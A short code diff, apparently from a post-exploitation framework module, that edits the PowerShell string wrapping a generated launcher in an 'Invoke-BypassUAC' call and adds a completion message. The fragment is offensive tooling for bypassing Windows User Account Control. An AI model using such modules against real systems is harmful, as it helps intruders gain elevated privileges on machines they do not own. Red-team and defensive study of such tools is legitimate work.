@@ -43,6 +43,8 @@ class Module:
 
         if launcher == "":
             raise ModuleValidationException("Error in launcher generation.")
-        script_end = f'Invoke-BypassUAC -Command "{launcher}"'
+        script_end = (
+            f'Invoke-BypassUAC -Command "{launcher}";`n"Invoke-BypassUAC completed!"'
+        )
 
         return script, script_end
